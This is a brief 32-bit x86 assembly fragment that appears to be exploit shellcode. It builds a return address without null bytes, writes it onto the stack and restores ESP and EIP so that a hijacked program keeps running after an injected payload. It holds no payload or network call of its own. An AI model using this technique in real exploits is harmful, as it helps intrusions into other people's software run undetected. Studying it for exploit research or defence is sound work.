[bits 32]
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Initialization: Prep ESP fixes                                       ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
mov eax,esp ;; save current esp
sub eax,0xFFFFFEFC ;; position at location of return addr
xor ecx,ecx
sub ecx,0xFFFFFFFC ;; set ecx == 0x04
sub eax,ecx ;; required as we cannot use `sub eax,0xFFFFFF00`
xor ecx,ecx ;; zero out ecx
mov ecx,0xD2D2D2D2 ;; set ecx up to 0x00435DBA
sub ecx,0xD28F7518 ;; ecx == 0x00435DBA (return address)
mov dword [eax],ecx ;; set up the return address in target ESP

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Finalization: Fix ESP and EIP                                        ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
mov esp,eax ;; restore proper esp
ret